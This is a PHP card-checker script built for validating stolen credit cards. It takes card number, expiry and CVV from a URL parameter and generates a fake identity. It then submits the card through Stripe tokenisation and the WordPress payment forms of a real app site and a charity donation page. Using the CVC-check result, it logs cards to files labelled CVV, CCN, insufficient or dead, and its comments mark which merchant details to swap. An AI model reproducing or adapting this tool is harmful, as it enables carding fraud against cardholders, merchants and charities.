<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

#----------------------------------------------------------------#
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#----------------------------------------------------------------#
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# ----------------- [ Nonce and Cookies ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://myprotectapp.com/plans/'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$headers = array();
$headers[] ='Host: myprotectapp.com'; // ETO LANG PAPALITAN
$headers[] ='Connection: keep-alive';
$headers[] ='Cache-control: max-age=0';
$headers[] ='Upgrade-insecure-requests: 1';
$headers[] ='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=STRIPE;q=0.9';
$headers[] ='Sec-Fetch-Mode: navigate';
$headers[] ='Sec-Fetch-User: ?1';
$headers[] ='Sec-Fetch-Site: none';
$headers[] ='Accept-Language: en-US,en;q=0.9';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);
$result0 = curl_exec($ch);
$nonce = trim(strip_tags(getStr($result0,'name="_wpnonce" value="','"')));
$wp = trim(strip_tags(getStr($result0, 'windows.tdwGlobal = {"','}'), '"wpRestNonce":"','"'));
$formid = trim(strip_tags(getStr($result0,'name="simpay_form_id" value="','"')));;


# ----------------- [ 1st curl  ] ---------------------#

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[email]='.$email.'&owner[phone]=096635580401&owner[address][postal_code]=10010&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2b876908-096c-4a9f-85e2-07c99ec3ed02be5808&muid=786f4a85-b5f7-4f0b-b53c-ab3471972f392ca91e&sid=cd18eb86-1f34-4503-b634-0ba8d067123ea2e317&pasted_fields=number&payment_user_agent=stripe.js%2Fa47fed43%3B+stripe-js-v3%2Fa47fed43&time_on_page=64743&referrer=https%3A%2F%2Fmyprotectapp.com%2F&key=pk_live_51FPE06BTrmGeQEwFaA2OnkARpQyLra6nFU6XJEqnRhkyvfKnsbcSvvKIHWp2rf8goNbC6A8GHLXiSs5gO0wUm9ro00tnkOg2Yj'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: api.stripe.com';
//$headers[] ='x-requested-with: ';
//$headers[] ='x-wp-nonce: ';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://js.stripe.com'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://js.stripe.com/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch); //printing the result
$gorilla = json_decode($result1, true);
$token1 = $gorilla['id'];

// echo $result1;

# ----------------- [ 2nd curl ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://myprotectapp.com/wp-json/wpsp/v2/customer'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_multi_plan_1521%5D=price_1HLGSSBTrmGeQEwFbkZwHTUB&form_values%5Bsimpay_email%5D='.$email.'&form_values%5Bsimpay_telephone%5D='.$phone.'&form_values%5Bsimpay_field%5D%5Bsimpay_1521_text_5%5D=100.00&form_values%5Bsimpay_field%5D%5Bsimpay_1521_number_6%5D=1&form_values%5Bsimpay_quantity%5D=1&form_values%5Bsimpay_coupon_nonce%5D=1d5fdfe5b4&form_values%5B_wp_http_referer%5D%5B%5D=%2Fplans%2F&form_values%5B_wp_http_referer%5D%5B%5D=%2Fplans%2F&form_values%5Bsimpay_form_id%5D='.$formid.'&form_values%5Bsimpay_amount%5D=399&form_values%5Bsimpay_multi_plan_id%5D=price_1HLGSSBTrmGeQEwFbkZwHTUB&form_values%5Bsimpay_multi_plan_setup_fee%5D=0&form_values%5Bsimpay_max_charges%5D=0&form_values%5B_wpnonce%5D='.$nonce.'&form_data%5BformId%5D='.$formid.'&form_data%5BformInstance%5D=1&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51FPE06BTrmGeQEwFaA2OnkARpQyLra6nFU6XJEqnRhkyvfKnsbcSvvKIHWp2rf8goNbC6A8GHLXiSs5gO0wUm9ro00tnkOg2Yj&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fmyprotectapp.com%2Fpayment-confirmation%2F&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fmyprotectapp.com%2Fpayment-failed%2F&form_data%5BstripeParams%5D%5Bname%5D=PROtect+Smart+Personal+Safety&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=CA&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=399&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BpaymentButtonText%5D=Pay+with+card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=user&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BfinalAmount%5D=3.99&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BplanId%5D=price_1HLGSSBTrmGeQEwFbkZwHTUB&form_data%5BplanSetupFee%5D=0&form_data%5BplanAmount%5D=3.99&form_data%5BuseCustomPlan%5D=false&form_id='.$formid.'&source_id='.$token1.''); //ETO LANG PAPALITAN'); //ETO LANG PAPALITAN

$headers = array();
$headers[] ='Host: myprotectapp.com'; // eto lang papalitan
$headers[] ='x-requested-with: XMLHttpRequest';
$headers[] ='x-wp-nonce: '.$wp.'';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://myprotectapp.com'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://myprotectapp.com/plans/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

$result2 = curl_exec($ch);
$toks2 = json_decode($result2, true);
$token2 = $toks2['id'];

$mesg = trim(strip_tags(getstr($result2,'"message":"','","')));
$check = trim(strip_tags(getstr($result,',"cvc_check":"','",')));

echo $check;
  
#----------------- [ 3rd Curl ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://hrmfoundation.org/wp-json/wpsp/v2/subscription'); //ETO LANG PAPALITAN
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_customer_name%5D=Zync+zyncboi+Boi&form_values%5Bsimpay_email%5D=zyncboi%40asdaasdgmail.com&form_values%5Bsimpay_multi_plan_'.$formid.'%5D=plan_EdxRf7lTeoe8n1&form_values%5Bsimpay_form_id%5D='.$formid.'&form_values%5Bsimpay_amount%5D=1000&form_values%5Bsimpay_multi_plan_id%5D=plan_EdxRf7lTeoe8n1&form_values%5Bsimpay_multi_plan_setup_fee%5D=0&form_values%5Bsimpay_max_charges%5D=0&form_values%5B_wpnonce%5D='.$nonce.'&form_values%5B_wp_http_referer%5D=%2Fdonations%2F&form_data%5BformId%5D='.$formid.'&form_data%5BformInstance%5D=7&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_UeOOkA8v2ELROlAJ5WCIbXdR&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fhrmfoundation.org%2Fpayment-confirmation%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fhrmfoundation.org%2Fpayment-failed%2F%3Fform_id%3D'.$formid.'&form_data%5BstripeParams%5D%5Bname%5D=HRM+Foundation&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Monthly+Donation&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=1000&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=user&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Donate+Monthly&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=embedded&form_data%5BfinalAmount%5D=10&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BplanId%5D=plan_EdxRf7lTeoe8n1&form_data%5BplanSetupFee%5D=0&form_data%5BplanAmount%5D=10&form_data%5BuseCustomPlan%5D=true&form_id='.$formid.'&customer_id='.$token2.''); //ETO LANG PAPALITAN
//souce_id= $token
//formid = $formid

$headers = array();
$headers[] ='Host: hrmfoundation.org'; // eto lang papalitan
$headers[] ='x-requested-with: XMLHttpRequest';
$headers[] ='x-wp-nonce: '.$wp.'';
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://hrmfoundation.org'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://hrmfoundation.org/donations/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';

curl_setopt($ch,CURLOPT_HTTPHEADER, $headers);

 $result3 = curl_exec($ch);
$check2 = trim(strip_tags(getstr($result3,',"cvc_check":"','",')));
$message = trim(strip_tags(getStr($result3, '"message":"','"')));
// $code = trim(strip_tags(getStr($result3, '"code":"card_declined","decline_code":"','"')));
// // echo $result3;

echo $code;
# ---------------- [Responses] ----------------- #
if (strpos($result2, ',"cvc_check":"pass",')) {
  fwrite(fopen('CVV.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-success">CVV</span> </span> <span class="badge badge-warning">'.$lista.'</span> <span class="badge badge-success"><b><i>2nd req: pass<b></i> [] <b><i>3rd req: '.$check2.''.$message.'</b></i> [] 🇸‌ 🇦‌ 🇬‌ 🇦‌ </span> </span> ';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">CCN</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">🇸‌ 🇦‌ 🇬‌ 🇦‌</span>';
}
elseif (strpos($result2, "The card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">CCN</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">🇸‌ 🇦‌ 🇬‌ 🇦‌</span>';
}
elseif (strpos($result2, ',"cvc_check":"fail",')) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">CCN</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">🇸‌ 🇦‌ 🇬‌ 🇦‌</span>';
}
elseif(strpos($result2, 'Your card has insufficient funds.')) {
  fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">CVV</span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-success"> '.$mesg.' | 🇸‌ 🇦‌ 🇬‌ 🇦‌</span> </span> ';
}
elseif (strpos($result2, "Invalid source object: must be a dictionary or a non-empty string.")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>PHARMACY </b>| 🇸‌ 🇦‌ 🇬‌ 🇦‌ </span> ';
}
elseif (strpos($result2, ',"cvc_check":"unavailable",')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>unavailable </b>| 🇸‌ 🇦‌ 🇬‌ 🇦‌ </span> ';
}
 else {
  fwrite(fopen('dead.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>'.$cvvcheck.''.$mesg.' </b> [] 🇸‌ 🇦‌ 🇬‌ 🇦‌ </span> ';
}
  curl_close($curl);
  ob_flush();
 
// echo $result2;
?>


